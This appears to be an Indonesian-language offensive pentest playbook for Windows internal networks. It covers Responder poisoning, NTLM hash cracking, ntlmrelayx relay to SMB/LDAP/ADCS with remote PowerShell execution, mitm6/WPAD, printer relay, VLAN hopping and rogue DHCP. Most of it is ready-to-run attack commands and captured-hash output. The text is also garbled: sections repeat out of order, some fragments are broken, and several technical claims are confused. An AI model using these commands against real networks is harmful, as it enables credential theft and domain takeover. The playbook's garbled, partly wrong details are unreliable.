logs/poisoners.log  — setiap query yang dijawab (SMB, HTTP, LDAP, etc.)
logs/Jenkins-PC.txt — hash dump per klien:
SMB
hashcat, jenkins::CORP:1122334455667788:3AB1...:0101000000...
```

### Kenapa berhasil
- LLMNR/NBT-NS tersimpanaktif by default di Windows 11 — group policy "Turn off multicast name resolution" sering tidak diterapkan di workstation tier rendah.
- Trigger paling umum: user salah ketik `\\fileserverr\share`, share yang di-mapping ke host terdecom,<SYS_LINK> auto discovery network drive.
- Sesi berjalan lama setelah trigger terjadi.
- Sufficient privilege SMB signing not required pada SAM account.

## 9.2 Decision Tree: Crack vs Relay

```
Hash ditangkap (SMB/HTTP/MD5 auth)
│
├─ Relaxed WSUS/local? → crack
│   hashcat -m 5600 ntlm.txt /usr/share/wordlists/rockyou.txt -r rule/OneRule
│
├─ Domain account + target berbeda (relay) → relay
│   ntlmrelayx (§9.3)
│
├─ Target relay-required signing? → relay gagal, crack
├─ Hanya machine acco"}】】attach:undefined → crack (pwdpump sering 32+ char, prioritas rendah, target untuk Kerberoast asalkan RBCD)
└─ relay path diblok, → crack hash atau rely on mDNS network hash asli → deployment

```

### Referensi cracking
| Format | hashcat mode | Contoh command |
|---|---|---|
| NTLMv2 (Responder SMB) | 5600 | `hashcat -m 5600 hash.txt rockyou.txt` |
| HTTP basic/digest via responder | per-form | gunakan `--::` separator sesuai output |
| NetNTLMv1 (via Responder `--basic` atau nt1challenge) | 5500 | crack terlebih dulu di crack.sh/shuffler → untuk NTDS |
| Kerberos AS-REP (Hashcat dari GetNPUsers) | 18200 | tool: impacket-GetNPUsers |

### versi tool
| Tool versi | Keterangan |
|---|---|
| Responder 3.1.x | `--disable-ess`, `--lm`, official GitHub lgandx |
| hashcat 6.2.6+ | mode 5600 default |
| John the Ripper jumbo 1.9.0 | format `netntlmv2`, berguna saat no GPU |

## 9.3 NTLM Relay — ntlmrelayx

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -wh attacker-wpad.corp.local -c "powershell -enc <base64>"
ntlmrelayx --no-http --no-smb -no-ldap -c whoami

# relay ke LDAP → RBCD
impacket-ntlmrelayx -t ldap://dc01.corp.local --delegate-access
# kemudian
impacket-getST -spn cifs/dc01 -impersonate administrator corp.local/attacker:F918b8
```

### Kondisi keberhasilan
- SMB Signing **disabled** (checking tool: `crackmapexec smb targets.txt --gen-relay-list`)
- `DisablePasswordChange`, `User Cannot Be relayed`: harus gunakan account target ≠ sumber (`A' -> B relay OK, A->A blocked sejak MS16-075 patch`).(removed era)
- LDAP/LDAPS channel binding not required
- Web enrollment HTTP Active Directory Certificate Services (ADCS) — `--adcs-ssl` via `certipy req` chain

### Kredensial yang dihasilkan
- `smbexec` session (`secretsdump` setelah `-c` getter)
- `secretsdump.py` output: administrator:500:aad3b…:<NT>::: → pass-the-hash
- ADCS: cert PFX → `certipy auth -pfx` → TGT → DCSync

## 9.4 mitm6 — WPAD via IPv6 + DHCPv6

### Apa yang dikirim
- Router Advertisement (RA) ICMPv6 type 134 men-set attacker sebagai IPv6 default gateway
- DHCPv6 reply menawarkan DNS IPv6 ke korban
- DNS AAAA spoof untuk WPAD: `wpad.corp.local → attacker IPv6`

```bash
sudo mitm6 -d corp.local --ignore-nodes-ns-aaaa
impacket-ntlmrelayx -6 -wh wpad.corp.local -t smb://targets.txt -smb2support
```

### Kenapa berhasil
- Windows prefer IPv6 DNS atau secondary. DNS IPv4 tetap aktif, tapi AutoDetect PAC via DHCP option 252 & WPAD akan query DNS attacker.
- WPAD GPO "DisableWinHTTPAutoProxy" default FALSE.
- Daerah efek: korban sekarang tergantung permintaan web HTTPS, semua query AAAA melewati attacker.

### Kenapa gagal
- IPv6 benar-benar disabled pada switch ports (rare but happens)
- `RegisterWpadInHosts` + GPO "Turn off WinHTTP proxy auto-discovery" → no query
- Server DHCPv6 legit menang (adversary loses race), atau switch port guard RA/DHCP Snooping.

```bash
openssl req -x509 -newkey rsa:2048 -keyout wpad.key -out wpad.crt -days 30 -nodes
hashcat…

function FindProxyForURL(u, h) { return "PROXY 10.10.5.10:8080; DIRECT"; }
python3 -m http.server 80   # dengan header
```

WPAD.dat disajikan oleh Responde dengan `-w` flag → basic auth prompt via `w` menghasilkan NetNTLMv2 (function `w` berfungsi sekali, capture berlanjut via internal loop when svchost.exe WinHTTP runs.

## 7.1 LLMNR/NBT-NS/mDNS Poisoning — Responder

### Mekanisme
Windows 10/11 (termasuk 24H2, LLMNR/NBT-NS masih aktif default) mem-publish hostname resolution fallback: DNS gagal → LLMNR (multicast UDP 5355) → NBT-NS (UDP 137). Responder memalsukan jawaban sehingga korban mengirim NTLMv2 challenge-response ke kita. Berhasil karena default GPO `Turn off multicast name resolution` = Not Configured pada banyak enterprise.

### Perintah
```bash
# Poison semua protokol, dump hash
sudo responder -I eth0 -dwvP
# -d    : enable DHCP (rogue, lihat 7.7)
# -w    : enable WPAD rogue auth server
# -P    : force Plaintext HTTP Basic auth (NTLMv1/2 tetap di-copy)
# -v    : verbose

# Mode analisis pasif (tanpa poison, untuk rekonsiasi)
sudo responder -I eth0 -A
```

### Apa yang dikirim vs muncul
| Layer | Dikirim attacker | Hasil |
|---|---|---|
| LLMNR | spoofed A record via UDP/5355 | koneksi SMB/HTTP/auth dari korban |
| NBT-NS | UDP/137 NB name registration response | sama |
| mDNS | UDP/5353 response untuk `*.local` | biasanya non-NTLM, URL credential |

File output:
```
/usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt
jenkins::CORP:1122334455667788:0123456789ABCDEF:0101000000000000...
```

### Sukses/gagal
- **Berhasil**: user salah ketik `\\fileserver\share` (typo SMB), scheduled task/shortcut ke host yang sudah decomm, browser PAC autodetect (WPAD, lihat 7.4).
- **Gagal**: GPO LLMNR off; traffic hanya mDNS/LLMNR dari host yang tidak melakukan auth; network segmentation — Responder hanya poison dalam satu broadcast domain.

## 7.2 Decision Tree: Crack vs Relay

```
Mendapat NTLMv2 hash (NetNTLMv2 = challenge-response, NO plaintext)
│
├─ Cek apakah hash berasal DARI MESIN YANG BISA DI-RELAY?
│   (Bukan: klien → co-relay lewat SMB/HTTP/LDAP relay)
│
├─ PRIORITY 1: RELAY jika salah satu target adalah server dengan SMB signing disabled
│   └─ ntlmrelayx.samba -tf targets.txt --smb2support
│
├─ PRIORITY 2: CRACK (quick win credential reuse) jika:
│   ├─ Hash kompleks rendah (service account LAPs-vs-AD difference)
│   └─ Wordlist politik password po
│
├─ PRIORITY 3: RELAY via LDAP jika target = DC dan Channel Binding Tul (LDAP signing not enforced)
│   └─ ntlmrelayx -t ldap://dc01 --delegate-access--escalate
│
└─ Jika keduanya gagal → hash jadi referensi pentest report (crack offline, no other use)
```

Relay lebih valuable: mendapatkan **shell/session**, bukan hanya hash. Crack dependency: password policy lemah / credential reuse.

### Perintah crack NTLMv2
```bash
hashcat -m 5600 hash.txt /opt/wordlists/rockyou.txt -r rule/OneRuleToRuleThemAll
# NetNTLMv1 (5500): shuffler, tingkat degradasi NT → crack menjadi full NT hash → pass-the-hash
```

## 7.3 NTLM Relay — ntlmrelayx / Relay Targets

```bash
sudo impacket-ntlmrelayx.py -tf targets.txt -smb2support -socks
sudo impacket-ntlmrelayx.py -tf targets.txt -c 'powershell -enc <b64>'

# Enumerasi SMB signing sebelum relay:
cme smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
ldapdomaindump via relay:
ntlmrelayx.py -t ldaps://dc01.corp.local --escalate-user svc_itscm
```

### Kondisional sukses relay
| Target | Prasyarat | Pouch |
|---|---|---|
| SMB | SMB signing not required | shell/secretsdump |
| LDAP/LDAPS | LDAP signing not enforced, LDAPS channel binding tidak di-enforce (staking 100% pada CVE-2022-36073 MS14-068 patches) | RBCD escalation, shadow credentials |
| HTTP (ADCS CES) | AD CS Web Enrollment enabled | certificate for user |
| MSSQL | service without encryption | xp_cmdshell |

### Anti-pattern religious fix Windows 11 24H2
Credential Guard aktif → NTLM offline untuk **hello-based sign-in**, tapi masih protocol fallback ke NTLMv2 jika GPO "Network security: LAN Manager authentication level" masih "send NTLMv2". Keep relaying.

## 7.4 mitm6 + WPAD

mitm6 menjawab DHCPv6 (UDP 547) dan menjadikan diri DNS IPv6 default karena Windows **mem-prioritize IPv6 DNS di atas IPv4**. Sejak MS16-063 (`KB3161608`), DHCPv6 di-disable jika link-local router advertisement mati — mitm6 mengirim RA sendiri untuk re-enable quirk.

```bash
sudo mitm6 -d corp.local -i eth0
impacket-ntlmrelayx.py -6 -wh wpad.corp.local -t ldaps://dc01 -socks
# -wh : fake WPAD server hostname bound ke mitm6 DNS
```

**Apa yang muncul**: klien mengirim DNS AAAA query → mitm6 jawab → Windows `WinHTTP`-based WPAD attempt (`http://wpad.corp.local/wpad.dat`) sukses → relay NTLM sesi ke LDAP (yang IPv4) → RBCD/takeover.

**Kenapa sukses**: WPAD default enabled di IE/Edge (legacy policy), DHCPv6 oleh Windows even if statically disabled IPv6 stack services — RA wins. Windows tidak hits default GPO `DisableWPAD` (KB.pak) yang memblok `WinHttpDetectAutoProxyConfigUrl`.

**Kenapa gagal**: `ipv6 mtu` off di NIC, switchport tidak punya IPv6 ACL (rare), WPAD GPO disable, ISO 2008 `DNS Suffix` dieket... (cdot: mitigation `svc_trust` tidak menjelaskan WPAD entry).

---

## 7.5 WS-Discovery / Printer Relay

Prinsip: printer/camera/Xerox stasioner melakukan **WSD (UDP 3702)** probing dan **LLMNR/AirPrint/mDNS** untuk discovery. Responder membaca, kemudian:
1. kirim SPN routing untuk REMOTE-UI → printer melakukan NTLM auth scanner ke "share" fake → relay.
2. NTLM auth dari biasanya **service account domain dengan password embedded (svc_scanner)**.

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support --http-port 80
# pastikan Responder Hanya men-disable SMB/HTTP via Responder.conf OFF agar transaksi lewat relay:
sudo sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /usr/share/responder/Responder.conf
sudo responder -I eth0
```

Juga: `wsdd` (WS-Discovery daemon di Samba) kadang tidak dikonfigurasikan; RFC fiber — termasuk `NTLMRelay` yang sering gratis karena authentication LLM NR network drive \\printserver oleh scanner issue (HP PageWide, Canon iR series firmware <2020 tidak mensupport SMB signing → relay relied legacy).

## 7.6 VLAN Hopping

| Teknik | Perintah | Sukses condition |
|---|---|---|
| **DTP Spoofing (trunk negotiation)** | `yersinia -G` → DTP tab → "send DTP negotiation" atau `frogger -i eth0` | switchport mode dynamic desirable/auto — default legacy Cisco 2960 |
| **Double tagging (802.1Q)** | `scapy: sendp(Ether()/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(...))` | attacker di VLAN 10 = haru native VLAN target 20; return traffic tidak menerima balik (satu arah) |
| **VoIP hopping** | Voice VLAN bypass via CDP spoof (`voice hopper.py`) | softphone/Cisco phone trust CDP, voice VLAN unauthenticated |

### Perintah double tagging (Scapy)
```python
from scapy.all import *
pkt = Ether()/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(dst="10.20.0.5")/ICMP()
sendp(pkt, iface="eth0")
```

DTP sukses membuka mencapai seluruh VLAN:
```bash
# setelah trunk terbentuk:
sudo vconfig add eth0 20  # atau ip link add link eth0 name eth0.20 type vlan id 20
sudo ip a add 10.20.0.100/24 dev eth0.20
nmap -sn 10.20.0.0/24
```

**Gagal**: `switchport mode access`, `switchport nonegotiate`, `switchport trunk native vlan != attacker VLAN`.


Result: klien DHCP berikutnya DNS → kita → WPAD poisoning → mitm6 efek uri legit DHCP. Rope(tipuan) Rogue DHCP race: legit server lebih responsif; kirim **DHCPNAK storm** (tool `yersinia dhcp attack`) untuk bump lease renewal ke kita.

|---|---|
